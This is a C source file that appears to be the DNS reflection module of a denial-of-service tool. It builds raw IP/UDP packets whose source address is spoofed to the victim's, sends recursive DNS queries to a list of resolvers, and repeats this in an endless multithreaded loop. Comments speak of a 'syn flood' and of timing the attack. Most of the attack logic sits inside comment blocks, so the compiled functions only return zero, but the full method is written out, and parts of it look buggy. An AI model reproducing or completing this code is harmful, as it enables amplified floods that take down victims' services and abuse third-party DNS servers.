#include <stdio.h>      // printf
#include <string.h>     // strlen
#include <stdlib.h>     // malloc
#include <sys/socket.h> // you know what this is for
#include <netinet/in.h>
#include <netinet/udp.h>
#include <netinet/ip.h> // struct ip

#include <unistd.h> // getpid
#include <errno.h>
#include <pthread.h>
#include <signal.h>

#include "../main.h"

// list of DNS Servers registered on the system
// char dns_servers[10][100];
// int dns_server_count = 0;

// #pragma pack(push, 1)
// #pragma pack(pop)

static int ChangetoDNSNameFormat(char *input)
{
    int lock = 0, i;
    char *host = (char *)malloc(strlen(DNS_QUERY_NAME_DEFAULT) + 2);
    if (!host)
    {
        error("ChangetoDNSNameFormat malloc failed");
        return 1;
    }
    if (!strcpy(host, DNS_QUERY_NAME_DEFAULT))
    {
        error("ChangetoDNSNameFormat strcpy failed");
        return 1;
    }
    if (!strcat(host, "."))
    {
        error("ChangetoDNSNameFormat strcat failed");
        return 1;
    }
    int host_len = strlen(host);

    for (i = 0; i < host_len; i++)
    {
        if (host[i] == '.')
        {
            *input++ = i - lock;
            for (; lock < i; lock++)
            {
                *input++ = host[lock];
            }
            lock++; //or lock=i+1;
        }
    }
    *input++ = '\0';
    return 0;
}

static int SendDNS(const pDNSStruct ds, const int debug_level)
{
    // Perform a DNS query by sending a packet

    /*
    int socket_fd;
    socket_fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (socket_fd < 0)
    {
        error("Create socket failed: %s(%d)", strerror(errno), errno);
        if (errno == 1)
        {
            DebugMessage("This program should run as root user");
        }
        else if (errno == 24)
        {
            DebugMessage("You shoud check max file number use 'ulimit -n' in linux");
            DebugMessage("And change the max file number use 'ulimit -n <setting number>'");
            DebugMessage("Or you can change the EACH_IP_REPEAT_TIME value to delay the attack end time");
        }
        return 1;
    }

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    // dst
    sin.sin_port = htons((int)ds->src_port);
    sin.sin_addr.s_addr = inet_addr(ds->src_ip);

    char *datagram;
    //char *data;
    size_t pksize = sizeof(struct ip) + sizeof(struct udphdr) + sizeof(DNSHeader) + sizeof(Query);
    datagram = (char *)malloc(pksize);

    struct ip *iph;
    iph = (struct ip *)datagram;

    struct udphdr *udph;
    memset(datagram, 0, pksize);
    // filed the data

    int one = 1;
    const int *val = &one;
    if (setsockopt(socket_fd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
    {
        error("Error setting IP_HDRINCL: %s(%d)", strerror(errno), errno);
        //exit(0);
        return 1;
    }
    // entete ip
    iph->ip_v = 4;
    iph->ip_hl = 5;
    iph->ip_tos = 0;
    iph->ip_len = pksize;
    iph->ip_ttl = 255;
    iph->ip_off = 0;
    iph->ip_id = sizeof(45);
    iph->ip_p = IPPROTO_UDP;
    iph->ip_sum = 0; // a remplir aprés
    iph->ip_src.s_addr = inet_addr(ds->src_ip);
    iph->ip_dst.s_addr = inet_addr(ds->dst_ip);

    udph = (struct udphdr *)(datagram + sizeof(struct ip));
    // entete udp
    udph->uh_sport = htons(ds->src_port);
    udph->uh_dport = htons(ds->dst_port);
    udph->uh_ulen = htons(sizeof(struct udphdr));
    udph->uh_sum = CalculateSum((unsigned short *)udph, sizeof(struct udphdr));

    // use the UDP to send the data
    pDNSHeader dnsh = (pDNSHeader)(datagram + sizeof(struct ip) + sizeof(struct udphdr));
    // set the DNS structure to standard queries
    dnsh->id = (unsigned short)htons(getpid());
    dnsh->qr = 0;     // this is a query
    dnsh->opcode = 0; // this is a standard query
    dnsh->aa = 0;     // not authoritative
    dnsh->tc = 0;     // this message is not truncated
    dnsh->rd = 1;     // recursion desired
    dnsh->ra = 0;     // recursion not available! hey we dont have it (lol)
    dnsh->z = 0;      // make sure this is the zero in 3 bits
    dnsh->rcode = 0;

    dnsh->qcount = htons(1); //we have only 1 question
    dnsh->ancount = 0;
    dnsh->nscount = 0;
    dnsh->adcount = 0;

    // point to the query portion
    // filed the data
    pQuery query = (pQuery)(datagram + sizeof(struct ip) + sizeof(struct udphdr) + sizeof(DNSHeader));
    if (ChangetoDNSNameFormat(&(query->name)))
    {
        error("DNS name translate failed");
        return 1;
    }
    // memcpy(query->name, DNS_QUERY_NAME_DEFAULT, strlen(DNS_QUERY_NAME_DEFAULT));

    pQuestion question = (pQuestion)(datagram + sizeof(struct ip) + sizeof(struct udphdr) + sizeof(DNSHeader) + sizeof(Query));
    question->qtype = htons(DNS_QUERY_TYPE_DEFAULT); //type of the query , A , MX , CNAME , NS etc
    question->qclass = htons(1);                     //its internet (lol)

    ShowMessage(2, debug_level, "Sending Packet...");
    if (sendto(socket_fd, datagram, pksize, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
    {
        error("Send failed: %s(%d)", strerror(errno), errno);
    }

    free(datagram);
    close(socket_fd);
    */
    return 0;
}

static int AttackThread(pDNSStruct dns_struct)
{
    // now we start the syn flood attack

    /*
    int i;
    pStrNode str_node = dns_struct->str_header->next;
    pSplitUrlRet split_result;

    ShowMessage(VERBOSE, dns_struct->debug_level, "AttackThread start sending data...");

    while (str_node)
    {

        // in here, we deal with the ip list
        if (!SplitUrl(str_node->str, &split_result))
        {
            error("AttackThread SplitUrl failed");
            return 1;
        }

        // node cicle

        ShowMessage(DEBUG, dns_struct->debug_level, "split_reult: %s", split_result->protocol);
        ShowMessage(DEBUG, dns_struct->debug_level, "split_reult: %s", split_result->host);
        ShowMessage(DEBUG, dns_struct->debug_level, "split_reult: %d", split_result->port);
        ShowMessage(DEBUG, dns_struct->debug_level, "split_reult: %s", split_result->suffix);

        if (split_result->port == 0)
        {
            if (strlen(split_result->host) == 0)
            {
                error("AttackThread SplitUrl not right");
                return 1;
            }
            // make the port as default
            split_result->port = ACK_REFLECT_PORT_DEFAULT;
        }
        // init the target ip and port
        dns_struct->dst_ip = (char *)malloc(IP_BUFFER_SIZE);
        if (!(dns_struct->dst_ip))
        {
            error("AttackThread malloc failed: %s(%d)", strerror(errno), errno);
            return 1;
        }
        if (!memset(dns_struct->dst_ip, 0, IP_BUFFER_SIZE))
        {
            error("AttackThread memset failed: %s(%d)", strerror(errno), errno);
            return 1;
        }
        if (!strncpy(dns_struct->dst_ip, split_result->host, strlen(split_result->host)))
        {
            error("AttackThread strncpy failed: %s(%d)", strerror(errno), errno);
            return 1;
        }
        dns_struct->dst_port = split_result->port;
        FreeSplitUrlBuff(split_result);

        // for test
        //DisplayWarning("src address: %s - src port: %d - dst address: %s - dst port: %d", syn_struct->src_ip, syn_struct->src_port, syn_struct->dst_ip, syn_struct->dst_port);

        for (i = 0; i < dns_struct->each_ip_repeat; i++)
        {
            if (SendDNS(dns_struct, dns_struct->debug_level))
            {
                error("AttackThread Attack failed");
                return 1;
            }
        }

        str_node = str_node->next;
    }
    */
    return 0;
}

int StartDNSReflectAttack(const pParameter input)
{
    // this file's core function

    /*
    pthread_t tid[input->max_thread];
    pthread_attr_t attr;
    int j, ret;

    ShowMessage(VERBOSE, input->debug_mode, "Enter StartSYNFlood");
    signal(SIGINT, SignalExit);

    pDNSStruct dns_struct = (pDNSStruct)malloc(sizeof(DNSStruct));
    pStrHeader str_header;
    pSplitUrlRet split_result;

    dns_struct->debug_level = input->debug_mode;
    dns_struct->each_ip_repeat = input->each_ip_repeat;

    if (!ProcessDNSIPListFile(&str_header))
    {
        error("ProcessDNSIPListFile failed");
        return 1;
    }

    if (!SplitUrl(input->address, &split_result))
    {
        error("AttackThread SplitUrl failed");
        return 1;
    }
    if (split_result->port == 0)
    {
        if (strlen(split_result->host) == 0)
        {
            error("AttackThread SplitUrl not right");
            return 1;
        }
        // make the port as default
        split_result->port = ACK_REFLECT_PORT_DEFAULT;
    }

    dns_struct->src_ip = (char *)malloc(IP_BUFFER_SIZE);
    if (!(dns_struct->src_ip))
    {
        error("AttackThread malloc failed: %s(%d)", strerror(errno), errno);
        return 1;
    }
    if (!memset(dns_struct->src_ip, 0, IP_BUFFER_SIZE))
    {
        error("AttackThread memset failed: %d(%s)", strerror(errno), errno);
        return 1;
    }
    if (!strncpy(dns_struct->src_ip, input->address, strlen(input->address)))
    {
        error("AttackThread copy SRC_ADDRESS failed: %s(%d)", strerror(errno), errno);
        return 1;
    }
    dns_struct->src_port = (int)split_result->port;

    FreeSplitUrlBuff(split_result);

    pIPList_Thread list, tmp_list;
    if (!SplitIPForThread(&list, input, str_header))
    {
        error("SplitIPForThread failed");
        return 1;
    }
    // str_header no longer used
    free(str_header);

    // unlimit loop
    for (;;)
    {
        // only one process
        tmp_list = list;
        // start again
        for (j = 0; j < input->max_thread; j++)
        {
            // every thread has onlyone target address
            // thread end try next address
            dns_struct->str_header = tmp_list->list;
            tmp_list = tmp_list->next;
            //DisplayWarning("syn_struct src_ip: %s", syn_struct->src_ip);

            //input->serial_num = (i * input->max_thread) + j;
            if (pthread_attr_init(&attr))
            {
                error("StartSYNFlood pthread_attr_init failed");
                return 1;
            }
            //if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED))
            if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_JOINABLE))
            {
                error("StartSYNFlood pthread_attr_setdetachstate failed");
                return 1;
            }
            // create thread
            ret = pthread_create(&tid[j], &attr, (void *)AttackThread, dns_struct);
            //printf("j is: %d\n", j);
            ShowMessage(DEBUG, input->debug_mode, "tid: %ld", tid[j]);
            // here we make a map
            if (ret != 0)
            {
                ShowMessage(DEBUG, input->debug_mode, "ret: %d", ret);
                error("Create pthread failed");
                return 1;
            }
            pthread_attr_destroy(&attr);
            // for the test
            // also for the each thread ready
            sleep(1);
        }
        //pthread_detach(tid);
        // join them all
        for (j = 0; j < input->max_thread; j++)
        {
            pthread_join(tid[j], NULL);
        }
        // exit for test
        //return 0;
    }
    FreeDNSStructBuff(dns_struct);
    FreeIPListBuff(list);

    //unsigned char hostname[100];
    //Now get the ip of this hostname , A record
    //ngethostbyname(hostname, T_A);
    */
    return 0;
}